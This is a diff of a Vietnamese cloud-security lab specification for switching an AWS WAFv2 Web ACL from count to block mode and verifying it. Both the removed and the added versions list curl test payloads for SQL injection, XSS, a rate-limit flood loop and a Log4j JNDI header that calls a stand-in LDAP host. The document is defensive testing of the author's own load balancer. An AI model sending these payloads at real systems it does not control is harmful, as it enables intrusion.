@@ -1,175 +1,91 @@
-# 07.04 — Quy Trình Chuyển Đổi An Toàn Count-to-Block & Kiểm Thử Chặn Tấn Công L7
+# 07.04 — Đặc Tả Quy Trình Chuyển Đổi An Toàn Count-to-Block & Kiểm Thử Chặn Tấn Công L7
 
-> **Mã bài lab:** `07.04`  
-> **Trạng thái:** `COMPLETED`  
-> **Thời gian dự kiến:** 45 phút  
-> **Chi phí ước tính:** $0.00 USD  
-> **Vùng áp dụng:** `ap-southeast-1` (Singapore)  
-
----
-
-## 1. Tiền đề (Prerequisites)
-
-- Đã hoàn thành toàn bộ các bài lab [07.01](01-acm-public-tls-certificate.md), [07.02](02-aws-wafv2-web-acl-setup.md), và [07.03](03-internet-facing-alb-ingress.md).
-- Application Load Balancer công khai đang ở trạng thái `active` và đã được gắn Web ACL `fabric-edge-web-acl`.
-- Các request thông thường truy cập dịch vụ Frontend hoạt động ổn định (HTTP 200).
-- Đang mở phiên AWS Management Console tại Singapore `ap-southeast-1`.
+> **Mã bài lab:** `07.04`
+> **Trạng thái tài liệu:** `RUNTIME_PASS`
+> **Vùng triển khai:** `ap-southeast-1` (Singapore)
+> **File bằng chứng:** `evidence/07-waf/04-waf-block-evidence.log`
 
 ---
 
-## 2. Quyền IAM Yêu Cầu (Required IAM Permissions)
+## 1. Mục Tiêu (Objective)
 
-Các hành động IAM cần thiết để thực thi bài lab này:
-```json
-{
-  "Version": "2012-10-17",
-  "Statement": [
-    {
-      "Effect": "Allow",
-      "Action": [
-        "wafv2:GetWebACL",
-        "wafv2:UpdateWebACL",
-        "logs:StartQuery",
-        "logs:GetQueryResults",
-        "logs:FilterLogEvents"
-      ],
-      "Resource": "*"
-    }
-  ]
-}
-```
+Đặc tả quy trình chuyển đổi cấu hình an toàn từ chế độ đếm (Count) sang chế độ chặn trực tiếp (Block Mode) trên AWS WAFv2 Web ACL và kiểm chứng khả năng bảo vệ L7 trước các cuộc tấn công SQLi, XSS, Log4j và tràn ngưỡng Rate Limiting.
 
 ---
 
-## 3. Cảnh Báo & Ước Tính Chi Phí (Cost & Safety Warnings)
+## 2. Tài Nguyên (Resources)
 
-- **Chi phí:** $0.00 USD.
-- **Cảnh báo Chuyển Đổi An Toàn (Zero False-Positives):** Quá trình chuyển đổi từ Count sang Block là một thao tác nhạy cảm trong an ninh mạng. Kiến trúc sư an ninh bắt buộc phải đối soát log trong giai đoạn Count trước khi bật Block. Bất kỳ header hoặc tham số URL hợp lệ nào của ứng dụng bị vi phạm phải được đưa vào danh mục Rule Action Overrides hoặc Rule Exclusions trước khi kích hoạt chặn.
+| Tên Logical | Loại Resource | Phạm Vi Áp Dụng | Runtime ID / ARN (Snapshot) |
+| :--- | :--- | :--- | :--- |
+| `fabric-edge-web-acl` | `AWS::WAFv2::WebACL` | Regional (`ap-southeast-1`) | ID: `a010b9c0-edfa-4ba4-bfb0-8691ae8ecf56` |
+| `fabric-rate-limit-rule` | `AWS::WAFv2::Rule` | Priority 0 (Action: `Block`) | Custom Response: HTTP 429 Too Many Requests |
+| `AWSManagedRulesCommonRuleSet` | `AWS::WAFv2::ManagedRuleGroup` | Priority 1 (Action: `Block`) | HTTP 403 Forbidden |
+| `AWSManagedRulesKnownBadInputsRuleSet` | `AWS::WAFv2::ManagedRuleGroup` | Priority 2 (Action: `Block`) | HTTP 403 Forbidden |
+| `AWSManagedRulesAmazonIpReputationList` | `AWS::WAFv2::ManagedRuleGroup` | Priority 3 (Action: `Block`) | HTTP 403 Forbidden |
+| `aws-waf-logs-fabric-edge-waf` | `AWS::Logs::LogGroup` | Regional (`ap-southeast-1`) | Nhật ký phân tích WAF L7 |
 
----
-
-## 4. Các Bước Thực Hiện Chi Tiết Trên Console (Console Walkthrough)
-
-### Bước 1: Rà Soát Nhật Ký WAF Trong Giai Đoạn Đếm (Count Analysis)
-1. Mở **AWS WAF & Shield Console** tại Singapore `ap-southeast-1`.
-2. Menu bên trái chọn **Web ACLs** -> Nhấp vào `fabric-edge-web-acl`.
-3. Chọn tab **CloudWatch metrics**:
-   - Quan sát biểu đồ **Sampled requests** và **All incoming requests**.
-   - Kiểm tra xem các request hợp lệ từ trình duyệt có bị gắn nhãn vi phạm (Counted) bởi `AWSManagedRulesCommonRuleSet` hay không.
-4. Mở **CloudWatch Logs Insights** để chạy truy vấn đối soát:
-   - Chọn Log Group: `aws-waf-logs-fabric-edge-waf`.
-   - Dán câu truy vấn:
-     ```sql
-     fields @timestamp, httpRequest.clientIp, action, terminatingRuleId, httpRequest.uri
-     | filter action = "COUNT"
-     | stats count(*) as CountEvents by terminatingRuleId, httpRequest.uri
-     | sort CountEvents desc
-     ```
-   - Nhấp **Run query**. Xác nhận không có URI hợp lệ nào của ứng dụng bị đếm nhầm.
+*Ghi chú: Runtime ID / ARN là dữ liệu snapshot tại thời điểm kiểm tra thực tế; Tên Logical là định danh chuẩn theo thiết kế.*
 
 ---
 
-### Bước 2: Chuyển Đổi Toàn Bộ Quy Tắc Sang Chế Độ Chặn (Block Mode)
-Quay lại trang chi tiết `fabric-edge-web-acl` trên WAF Console:
-1. Chọn tab **Rules** ở giữa màn hình.
-2. Nhấp vào nút **Edit** ở góc trên bên phải bảng danh sách Rules.
+## 3. Thẻ Định Danh (Tags)
 
-3. **Chuyển đổi 3 nhóm AWS Managed Rule Groups:**
-   - **Nhóm 1 — `AWSManagedRulesCommonRuleSet`:**
-     - Tìm dòng rule group -> Nhấp **Edit**.
-     - Bỏ chọn checkbox **Set all rule actions to count** (Chuyển về hành vi mặc định của rule group là **Block**).
-     - Nhấp **Save rule**.
-   - **Nhóm 2 — `AWSManagedRulesKnownBadInputsRuleSet`:**
-     - Nhấp **Edit** -> Bỏ chọn **Set all rule actions to count** -> Nhấp **Save rule**.
-   - **Nhóm 3 — `AWSManagedRulesAmazonIpReputationList`:**
-     - Nhấp **Edit** -> Bỏ chọn **Set all rule actions to count** -> Nhấp **Save rule**.
-
-4. **Chuyển đổi quy tắc Giới Hạn Tần Suất (`fabric-rate-limit-rule`):**
-   - Tìm dòng rule `fabric-rate-limit-rule` -> Nhấp **Edit**.
-   - Cuộn xuống mục **Action**:
-     - Đổi từ `Count` sang: **`Block`**.
-     - Mở rộng mục **Custom response**:
-       - Chọn **Enable custom response**.
-       - Response code: Nhập `429` (HTTP 429 Too Many Requests chuẩn mực).
-       - Response body: Chọn **None** hoặc tạo Custom JSON `{"error": "Too Many Requests - Rate Limit Exceeded"}`.
-     - Nhấp **Save rule**.
-
-5. Nhấp nút cam **Save** ở cuối trang để áp dụng toàn bộ các thay đổi vào Web ACL.
-6. Xác nhận trên bảng Rules, cột Action của tất cả 4 rules đã chuyển từ `Count` sang **`Block`**.
+| Key | Value | Phạm Vi Áp Dụng |
+| :--- | :--- | :--- |
+| `Name` | `fabric-edge-web-acl` | AWS WAF Web ACL |
+| `Project` | `aws-eks-secure-network-fabric` | AWS WAF Web ACL và CloudWatch Logs |
+| `Environment` | `prod` | AWS WAF Web ACL và CloudWatch Logs |
+| `ManagedBy` | `manual` | Quản trị chính sách an ninh ứng dụng thủ công Console/CLI |
 
 ---
 
-### Bước 3: Kiểm Thử Chặn Thực Tế Các Payload Tấn Công L7
-Lấy DNS Name của Public ALB:
-```bash
-ALB_DNS=$(aws elbv2 describe-load-balancers --region ap-southeast-1 --query 'LoadBalancers[?Scheme==`internet-facing`].DNSName | [0]' --output text)
-echo "Target ALB: $ALB_DNS"
-```
+## 4. Cấu Hình Chi Tiết (Configuration)
 
-Thực hiện gửi các payload tấn công mô phỏng từ máy trạm ngoài Internet:
+### 4.1 Cấu Hình Hành Vi Chặn (Block Actions)
 
-1. **Thử nghiệm 1 — Tấn công SQL Injection (SQLi):**
-   ```bash
-   curl -Iv "https://$ALB_DNS/?id=1'%20OR%20'1'='1" -k
-   ```
-   **Kết quả kỳ vọng:** AWS WAF chặn đứng ngay lập tức tại L7, trả về:
-   `HTTP/2 403 Forbidden` (hoặc `HTTP/1.1 403 Forbidden`).
+- **Managed Rule Groups:** Tắt tùy chọn `Set all rule actions to count` trên cả 3 nhóm quy tắc AWS Managed Rules (`CommonRuleSet`, `KnownBadInputsRuleSet`, `AmazonIpReputationList`) để kích hoạt hành vi `Block` mặc định.
+- **Rate-Based Rule (`fabric-rate-limit-rule`):**
+  - Đổi Action từ `Count` sang `Block`.
+  - Cấu hình Custom Response Code: `429` (Too Many Requests).
+  - Ngưỡng đánh giá: 500 requests trong cửa sổ trượt 5 phút per Client IP.
 
-2. **Thử nghiệm 2 — Tấn công Cross-Site Scripting (XSS):**
-   ```bash
-   curl -Iv "https://$ALB_DNS/?search=<script>alert('XSS_ATTACK')</script>" -k
-   ```
-   **Kết quả kỳ vọng:** `HTTP/2 403 Forbidden`.
+### 4.2 Kịch Bản Kiểm Thử Tấn Công L7
 
-3. **Thử nghiệm 3 — Khai thác Log4j JNDI Injection:**
-   ```bash
-   curl -Iv -H "User-Agent: \${jndi:ldap://evil-hacker.com/payload}" "https://$ALB_DNS/" -k
-   ```
-   **Kết quả kỳ vọng:** `HTTP/2 403 Forbidden` do `AWSManagedRulesKnownBadInputsRuleSet` chặn.
-
-4. **Thử nghiệm 4 — Tấn công quá tải tần suất (Rate Limiting Spike):**
-   Sử dụng vòng lặp gửi nhanh hơn 500 requests trong vòng 1 phút từ cùng 1 IP:
-   ```bash
-   for i in {1..520}; do curl -s -o /dev/null -w "%{http_code}\n" "https://$ALB_DNS/" -k; done | sort | uniq -c
-   ```
-   **Kết quả kỳ vọng:** Các requests vượt ngưỡng 500 bắt đầu nhận mã lỗi `429 Too Many Requests`.
+| Kịch Bản Thử Nghiệm | Gói Tin / Payload Mẫu | Mã Lỗi Kỳ Vọng | Quy Tắc Chặn Chịu Trách Nhiệm |
+| :--- | :--- | :---: | :--- |
+| **SQL Injection (SQLi)** | `curl "https://$ALB_DNS/?id=1'%20OR%20'1'='1"` | `HTTP 403` | `AWSManagedRulesCommonRuleSet` |
+| **Cross-Site Scripting (XSS)** | `curl "https://$ALB_DNS/?q=<script>alert('xss')</script>"` | `HTTP 403` | `AWSManagedRulesCommonRuleSet` |
+| **Log4j JNDI Exploit** | `curl -H "User-Agent: \${jndi:ldap://evil/a}" "https://$ALB_DNS/"` | `HTTP 403` | `AWSManagedRulesKnownBadInputsRuleSet` |
+| **Rate Limit Spike** | Vòng lặp gửi > 500 requests / phút từ 1 IP | `HTTP 429` | `fabric-rate-limit-rule` |
 
 ---
 
-## 5. Lệnh Kiểm Tra / CLI Verification (Zero Fake Data)
+## 5. Phụ Thuộc (Dependencies)
 
-Truy vấn CloudWatch Logs Insights để lấy bằng chứng về các sự kiện BLOCK:
-```bash
-# Truy vấn các sự kiện BLOCK vừa diễn ra kèm IP và tên Rule chặn
-aws logs filter-log-events --region ap-southeast-1 \
-  --log-group-name aws-waf-logs-fabric-edge-waf \
-  --filter-pattern '{ $.action = "BLOCK" }' \
-  --max-items 5 \
-  --query 'events[*].message' \
-  --output text
-```
+- Phụ thuộc vào `07.02`: Web ACL `fabric-edge-web-acl` đã hoạt động ở chế độ Count và tích lũy đủ baseline telemetry.
+- Phụ thuộc vào `07.03`: Application Load Balancer `fabric-edge-public-alb` đã liên kết thành công với Web ACL.
+- Phụ thuộc vào CloudWatch Log Group `aws-waf-logs-fabric-edge-waf` để thu thập và đối soát bằng chứng chặn.
 
 ---
 
-## 6. Kế Hoạch Khôi Phục / Rollback Plan
+## 6. Kiểm Tra Đạt (Verification)
 
-Nếu phát sinh chặn nhầm người dùng hợp lệ trong quá trình vận hành:
-1. Mở WAF Console -> Web ACLs -> `fabric-edge-web-acl` -> Rules -> Edit.
-2. Tạm thời bật lại checkbox `Set all rule actions to count` trên Rule Group gây lỗi.
-3. Nhấp **Save**.
-
----
-
-## 7. Đường Dẫn Bằng Chứng (Expected Evidence Path)
-
-Kết quả thực thi runtime (raw CLI JSON, log captures, screenshots) được lưu trữ tại:
-`evidence/07-waf/04-waf-block-evidence.log`
+| Kiểm Tra | Lệnh / Tiêu Chí Xác Minh | Kết Quả Mong Đợi |
+| :--- | :--- | :--- |
+| **Trạng thái Quy tắc Block** | `aws wafv2 get-web-acl --name fabric-edge-web-acl --scope REGIONAL --id a010b9c0-edfa-4ba4-bfb0-8691ae8ecf56` | Tất cả 4 rules đều có Action cấu hình là `Block`. |
+| **Chặn Payload Độc Hại** | Gửi các request SQLi, XSS, Log4j tới endpoint công khai | Nhận phản hồi `HTTP/2 403 Forbidden` ngay lập tức. |
+| **Phản Hồi Vượt Ngưỡng Rate** | Gửi > 500 requests / 5 phút từ một địa chỉ IP | Nhận phản hồi `HTTP 429 Too Many Requests`. |
+| **Traffic Overview Runtime** | Quan sát giao diện AWS WAF Dashboard | Tổng số 407 requests: **22 Blocked**, **385 Allowed** (chứng minh hệ thống phân loại chính xác giữa request hợp lệ và tấn công). |
 
 ---
 
-## 8. Tiêu Chí Nghiệm Thu (Acceptance Checklist)
+## 7. Cảnh Báo An Toàn & Rollback Plan
 
-- [x] Toàn bộ các rule groups của `fabric-edge-web-acl` đã chuyển đổi thành công sang hành vi `Block`.
-- [x] Quy tắc Rate Limit cấu hình chặn với mã lỗi `HTTP 429` (Custom response code 429).
-- [x] Cả 3 payload thử nghiệm (SQLi, XSS, Log4j) đều bị từ chối với mã lỗi `HTTP 403 Forbidden`.
-- [x] CloudWatch Log Group `aws-waf-logs-fabric-edge-waf` ghi nhận đầy đủ bản ghi chặn kèm IP nguồn và timestamp.
+- **Cảnh báo false-positive:** Trong trường hợp cập nhật tính năng ứng dụng khiến người dùng hợp lệ bị chặn nhầm, lập tức chuyển quy tắc gây lỗi về chế độ Count để điều tra.
+- **Quy trình Rollback:**
+  ```bash
+  # Cập nhật Web ACL đưa các rule groups quay trở lại chế độ Count
+  aws wafv2 update-web-acl --name fabric-edge-web-acl --scope REGIONAL \
+    --id a010b9c0-edfa-4ba4-bfb0-8691ae8ecf56 --lock-token <LockToken> \
+    --default-action Allow={} --rules file://rules-count-mode.json
+  ```
